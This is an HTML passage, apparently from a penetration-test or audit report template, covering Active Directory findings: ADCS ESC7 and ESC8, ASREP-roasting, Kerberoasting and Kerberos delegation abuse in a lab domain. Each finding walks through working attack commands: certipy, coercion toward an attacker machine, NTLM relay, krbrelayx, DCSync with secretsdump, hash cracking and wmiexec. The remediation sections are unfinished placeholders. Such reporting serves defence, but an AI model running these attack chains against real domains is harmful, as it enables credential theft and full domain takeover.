                                            <p>ESC7 is a vulnerability within ADCS where a low-privileged user has the
                                                ManageCA or Manage Certificate rights, which allow user to issue failed
                                                certificate requests such as exploit requests which have failed due to
                                                lacking permissions.</p>
                                            <p>TEST\test has ManageCA, ManageCertificates, Read, Enroll rights over
                                                test-CA-CA, giving TEST\test the ability to approve failed ESC1
                                                requests, thus allowing the user to exploit ESC1. TEST\test can request
                                                to enroll in the SubCA template (vulnerable to ESC1 by default). The
                                                request will be denied as only administraors can enroll in the template,
                                                however can simply issue the failed request using the manage permissions
                                                afterwards, facilitating successful ESC1.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a href="https://www.tarlogic.com/blog/ad-cs-esc7-attack/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain
                                                        certificate authorities for low-privileged users with the
                                                        ManageCA or Manage Certificate rights using certipy.</p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p
                                                        'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC7-1.png" alt="Finding ESC7">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. The SubCA template is by default vulnerable to ESC1, but only
                                                        administrators can enroll in the template. If disabled, this
                                                        template can first be enabled on the CA.</p>
                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local
                                                        -enable-template SubCA -u test@test.local -p 'Password123!'</p>

                                                    <p>A certificate based on the SubCA template can be requested with a
                                                        SAN of Administrator like in ESC1. This request will be denied,
                                                        but we will save the private key and note down the request ID.
                                                    </p>
                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca
                                                        test-CA-CA -target ca.test.local -template SubCA -upn
                                                        administrator@test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC7-2.png"
                                                        alt="Exploiting ESC7">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. The failed certificate request can be issued with the ca
                                                        command and the -issue-request <request ID> parameter.</p>
                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local
                                                        -issue-request 77 -u test@test.local -p 'Password123!'</p>

                                                    <p>The issued certificate can then be retrieved with the req
                                                        command.</p>
                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca
                                                        test-CA-CA -target ca.test.local -retrieve 77</p>

                                                    <p>The retrived certificate can then be used with PKINIT to
                                                        authenticate as the domain administrator and obtain their NTLM
                                                        hash, allowing full impersonation and domain privilege
                                                        escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip
                                                        192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC7-3.png"
                                                        alt="Exploiting ESC7">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC7 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle" id="ESC8"><u>ESC8</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate the identity of a domain controller via
                                            a 'NTLM relay' attack.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">CA Name</td>
                                                    <td>test-CA-CA</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">CA Endpoint</td>
                                                    <td>http://CA.test.local/certsrv/</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">Relay Protections</td>
                                                    <td>False</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
                                            <p>ESC8 is a vulnerability within ADCS where a certificate authority has the
                                                Web Enrollment service installed and is enabled via HTTP.
                                                The web enrollment interface (http://CA.test.local/certsrv/) is
                                                vulnerable to 'NTLM relay' attacks.
                                                Without necessary protections, the web services endpoint can by-default
                                                be exploited to issue arbitrary certificates in the context of the
                                                coerced authentication (i.e. of a domain controller) to any low
                                                privileged user.</p>
                                            <p>This allows a low-privileged user to escalate to a domain controller and
                                                extract all user passwords from the domain.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a
                                                    href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/">Link
                                                    2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain
                                                        certificate authorities HTTP web services endpoints and see if
                                                        they are lacking relaying protections using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p
                                                        'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-1.png" alt="Finding ESC8">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can by default coerce machine
                                                        authentication using RPC from the domain controller to an
                                                        attacker controlled machine
                                                        (192.168.10.130) with printerbug.py or dfscoerce.py.
                                                    </p>
                                                    <p class="code">python3 printerbug.py
                                                        test:'Password123'@192.168.10.141
                                                        192.168.10.130</p>
                                                    <p class="code">python3 dfscoerce.py -u test -p 'Password123!' -d
                                                        test.local
                                                        192.168.10.130 192.168.18.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-2.png"
                                                        alt="Coercing authentication">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. The coerced authentication is then relayed to an unsecured
                                                        certificate HTTP endpoint (e.g.
                                                        http://192.168.10.142/certsrv/certfnsh.asp)
                                                        to enroll in the default "DomainController" certificate template
                                                        under the context of the domain controller. This returns a pfx
                                                        certificate as the domain controller.
                                                    </p>

                                                    <p class="code">python3 entry.py relay -target
                                                        'http://192.168.10.141' -template
                                                        DomainController</p>
                                                    <p>This authentication certificate can be used to obtain the ntlm
                                                        hash for the domain controller.</p>
                                                    <p class="code">python3 entry.py auth -pfx 'dc.pfx' -dc-ip
                                                        192.168.10.141</p>
                                                    <p> The ntlm hash can then be used to replicate the behavior of a
                                                        domain
                                                        controller and obtain all the user password hashes within the
                                                        domain via a DCSync.</p>
                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes
                                                        :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-3.png"
                                                        alt="Relaying authentication to ADCS web endpoint">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Enforce HTTPS & EPA, disable Kerberos or disable the endpoint</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>



<!----------------------------------------->

<div class="finding-header">Kerberos</div>
<div class="finding-container">
<table>
    <thead>
        <tr>
            <th class="table-header">Issue</th>
            <th class="table-header">Risk</th>
        </tr>
    </thead>
    <tbody>                <tr>
            <td class="toggle" id="Highly-privileged-ASREP-roastable-user-with-a-weak-password"><u>Highly privileged ASREP-roastable user with a weak password</u></td>
            <td class="finding-riskCRITICAL">CRITICAL</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr><td>Password hash of a highly privileged account can be obtained and cracked.</td>                                        <td>T-15940</td>
                                <td>+50</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>jack
ASREPuser</td></tr>                    <tr><td class="grey">MemberOf</td><td>CN=Domain Admins,CN=Users,DC=test,DC=local CN=Enterprise Admins,CN=Users,DC=test,DC=local CN=Schema Admins,CN=Users,DC=test,DC=local
CN=Server Operators,CN=Builtin,DC=test,DC=local</td></tr>                                        <tr><td class="grey">Enabled</td><td>True</td></tr>
                                <tr><td class="grey">DoNotRequireKerberosPreauthentication</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>ASREP-roasting is a vulnerability where a user has the "Do not requrire Kerberos preauthentication" flag set within Active Directory. This means that when requesting a TGT from the KDC, the entire validation process of needing to present a timestamp encrypted with the users hashed password to validate that user is authorized to request the TGT is skipped. Therefore without even knowing the users password, it is possible to retrieve an encrypted TGT for the user in an AS-REP message.</p>
                                    <p>This means for 2 users it is possible to retrieve the user's hashed password and attempt to crack it if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://trustmarque.com/resources/asreproasting/>">Link 1</a></p>
                                    <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts that have the "Do not require Kerberos preauthentication" flag set within the directory.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-1.png" alt="Finding ASREP-roastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request an encrypted TGT for the user not requirng kerberos preauthenticaiton and obtain the password hash for the user.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --asreproast output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the do not require pre auth flag for X,Y,Z users - there is no use case for this.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Highly-privileged-Kerberoastable-user-with-a-weak-password"><u>Highly privileged Kerberoastable user with a weak password</u></td>
            <td class="finding-riskCRITICAL">CRITICAL</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr><td>Password hash of a highly privileged account can be obtained and cracked.</td>                                        <td>T1558.003</td>
                                <td>+50</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>Administrator
jack</td></tr>
                                    <tr><td class="grey">SPN</td><td>HOST/bob
HTTP/webserver</td></tr>                    <tr><td class="grey">MemberOf</td><td>CN=Group Policy Creator Owners,CN=Users,DC=test,DC=local CN=Domain Admins,CN=Users,DC=test,DC=local CN=Enterprise Admins,CN=Users,DC=test,DC=local CN=Schema Admins,CN=Users,DC=test,DC=local CN=Administrators,CN=Builtin,DC=test,DC=local
CN=Domain Admins,CN=Users,DC=test,DC=local CN=Enterprise Admins,CN=Users,DC=test,DC=local CN=Schema Admins,CN=Users,DC=test,DC=local</td></tr>                                        <tr><td class="grey">Enabled</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Kerberoasting-roasting is a vulnerability where an account has a Service Principal Name (SPN) set and a weak password within Active Directory. In Microsoft Windows, SPNs are simply unique identifiers of service accounts. By design, to access the service run by the account, domain users request tickets (TGS) for that service using Kerberos which are encrypted with the service accounts NTLM hash. This is possible by any domain user, regardless if they have permission to access the service or not. The TGS is encrypted with a hashed vesion of the account's password, which can be retrieved from the TGS./p>
                                    <p>This means for 2 users with an SPN set, it is possible to retrieve the user's hashed password that can be cracked if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://attack.mitre.org/techniques/T1558/003/>">Link 1</a></p>
                                    <p><a href="https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts with an SPN set.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-1.png" alt="Finding Kerberoastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request a TGS for the service and extract the password hash from the TGS for the service account.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --kerberoasting output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --format=krb5tgs --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the SPN / move to low privileged account / gMSA.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Unconstrained-delegation"><u>Unconstrained delegation</u></td>
            <td class="finding-riskHIGH">HIGH</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
                                <td>A server that is set for unconstrained delegation can compromise the entire domain.</td>
                                <td>T1558.001</td>
                                <td>+30</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Object</td><td>UNCONSTRAINED$</td></tr>
                                    <tr><td class="grey">TrustedForDelegation</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Servers with unconstrained delegation configured cache user's tickets when they authenticate to the frontend service, in order to delegate on behalf of the user to another backend service. This is dangerous if a high privleged user or a domain controller (a connection can be forced using the spooler service) then the domain can be compromised.</p>
                                    <p>If computers with unconstrained delegation are compromised, full domain compromise is achievable by coercing authentication from a domain controller, who's ticket will be then be cached and can be extracted on the computer facilatating impersonation of a domain controller.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://blog.netwrix.com/2022/12/02/unconstrained-delegation/">Link 1</a></p>
                                    <p><a href="https://pentestlab.blog/2022/03/21/unconstrained-delegation/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can find which servers are configured for unconstrained delegation using netexec. Domain controllers are configured for unconstrained delegation by default and can be excluded.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123' --trusted-for-delegation</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-1.png" alt="Finding unconstrained delegation">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. For the purpose of this attack it's assumed the server configured for unconstrained delegation has been compromised, and credential memory dumped.</p>
                                            <p class="code">impacket-secretsdump Administrator:'Password123!'@dc.test.local -just-dc-user 'unconstrained$'</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-2.png" alt="Compromise of unconstrained delegation server">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. With unconstrained$ already compromised, it can update its SPN to point to a service running on an attacker machine "attacker.test.local". This is doen so when a DC authenticates to the unconstrained$ service it will be tricked to send the ticket to the attacker machine.</p>
                                            <p class="code">python3 addspn.py -u test.local\\unconstrained\$ -p aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72 -s HOST/attacker.test.local dc.test.local --additional</p>
                                            <p>A DNS record can be added by any low-privileged account to the domain, so one is added to point the SPN to the IP of the attacker kali machine which will update every 180 seconds.</p>
                                            <p class="code">python3 dnstool.py -u test.local\\unconstrained\$ -p aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72 -r attacker.test.local -d 192.168.10.130 --action add dc.test.local</p>
                                            </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-3.png" alt="Adding SPN & dns record">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>4. Authentication can be coerced from the domain controller to the attacker machine using printerbug.</p>
                                            <p class="code">python3 printerbug.py test:'Password123!'@dc.test.local attacker.test.local</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-4.png" alt="Coercing authentication">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>5. A kerberos listener is started to collect, decrypt and save the cached TGS of the domain controller intercepted from the coerced authentication.</p>
                                            <p class="code">python3 krbrelayx.py -hashes aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72</p>

                                            <p>Finally, with the ticket of the domain controller obtained, a DCSync can be performed to extract all user credentials to fully compromise the domain.</p>
                                            <p class="code">export KRB5CCNAME=DC\$@TEST.LOCAL_krbtgt@TEST.LOCAL.ccache</p>
                                            <p class="code">impacket-secretsdump -k -no-pass dc.test.local</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-5.png" alt="Exploiting unconstrained">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Unconstrained remediation</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Constrained-delegation"><u>Constrained delegation</u></td>
            <td class="finding-riskHIGH">HIGH</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
                                <td>A server has full control of another server by being allowed to delegate to it (msDS-AllowedToDelegateTo).</td>
                                <td>T1558.001</td>
                                <td>+30</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Object</td><td>DESKTOP-JKTS35O$
CA$</td></tr>
                                    <tr><td class="grey">AllowedToDelegateTo</td><td>cifs/CA.test.local cifs/CA
CN=CA,CN=Computers,DC=test,DC=local.'msDS-AllowedToDelegateTo'</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Constrained delegation allows a computer to delegate to specific services on another server. Constrained delegation is configured on the computer or user object. It is set through the msds-allowedtodelegateto property by specifying the SPN the current object is allowed constrained delegation against.</p>
                                    <p>If computers with constrained delegation are compromised, full compromise of the server it has permission to delegate to is achievable by proxy.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://blog.netwrix.com/2023/04/21/attacking-constrained-delegation-to-elevate-access/">Link 1</a></p>
                                    <p><a href="https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can find which servers are configured for constrained delegation by searching for servers with the 'msDS-AllowedToDelegateTo' property populated.</p>
                                            <p class="code">impacket-findDelegation -target-domain test.local test.local/test:'Password123!'</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/constrained-1.png" alt="Finding constrained delegation">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. If the frontend service is compromised (DESKTOP-JKTS35O$), an adversary can request a ticket for any service on the backend (CA$).</p>
                                            <p class="code">impacket-getST -dc-ip dc.test.local -spn cifs/CA.test.local -impersonate administrator test.local/'DESKTOP-JKTS35O$' -hashes :511e061a15068d1cbda8dfc4cc22a2f3</p>
                                            <p>With a CIFS ticket obtained for the backend service, an adversary can remotely connect and obtain an administrator command prompt on the backend service..</p>
                                            <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                            <p class="code">impacket-wmiexec -k -no-pass administrator@ca.test.local</p>
                                            </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/constrained-2.png" alt="exploiting constrained delegation">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Constrained remediation</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Resource-based-constrained-delegation"><u>Resource-based constrained delegation</u></td>
            <td class="finding-riskHIGH">HIGH</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
                                <td>A server has full control of another server by being allowed to act on behalf of it (msDS-AllowedToActOnBehalfOfOtherIdentity).</td>
                                <td>T1558.001</td>
                                <td>+30</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Object</td><td>DESKTOP-JKTS35O$
CA$</td></tr>
                                    <tr><td class="grey">msDS-AllowedToActOnBehalfOfOtherIdentity</td><td>TEST\attackerComputer$
TEST\RBCD$</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Resource-based constrained delelgation (RBCD) was introduced in Windows server 2012 and is where a server permits delegation from a frontend service to a backend service. This is configured on the backend service via the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property. This type of delegation was seen as more secure than unconstrained or constrained, however if the frontend service is compromised, the backend service will also be by proxy.</p>
                                    <p>TEST\attackerComputer$
TEST\RBCD$ can delegate to any resource on DESKTOP-JKTS35O$
CA$ permitting lateral movement between the two.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://redfoxsec.com/blog/rbcd-resource-based-constrained-delegation-abuse/">Link 1</a></p>
                                    <p><a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can find which servers are configured for RBCD by searching for those with the msDS-AllowedToActOnBehalfOfOtherIdentity property populated.</p>
                                            <p class="code">Get-ADComputer 'CA' -Properties PrincipalsAllowedToDelegateToAccount</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/RBCD-1.png" alt="Finding RBCD">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. If the frontend service is compromised (RBCD$), an adversary can request a ticket for any service on the backend (CA$).</p>
                                            <p class="code">impacket-getST -dc-ip dc.test.local -spn cifs/CA.test.local -impersonate administrator test.local/'RBCD$' -hashes :88d61b9ad3988a5bb86ca8ba9386d736</p>
                                            <p>With a CIFS ticket obtained for the backend service, an adversary can remotely connect and obtain an administrator command prompt on the backend service.</p>
                                            <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                            <p class="code">impacket-wmiexec -k -no-pass administrator@ca.test.local</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/RBCD-2.png" alt="Exploiting RBCD">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>RBCD remediation</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Low-privileged-Kerberoastable-user-with-a-weak-password"><u>Low privileged Kerberoastable user with a weak password</u></td>
            <td class="finding-riskHIGH">HIGH</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr><td>Password hash of a low privileged account can be obtained and cracked.</td>                                        <td>T1558.003</td>
                                <td>+25</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>TERESA_MCFARLAND
bob</td></tr>
                                    <tr><td class="grey">SPN</td><td>http/test
test/HTTP</td></tr>                                        <tr><td class="grey">Enabled</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Kerberoasting-roasting is a vulnerability where an account has a Service Principal Name (SPN) set and a weak password within Active Directory. In Microsoft Windows, SPNs are simply unique identifiers of service accounts. By design, to access the service run by the account, domain users request tickets (TGS) for that service using Kerberos which are encrypted with the service accounts NTLM hash. This is possible by any domain user, regardless if they have permission to access the service or not. The TGS is encrypted with a hashed vesion of the account's password, which can be retrieved from the TGS./p>
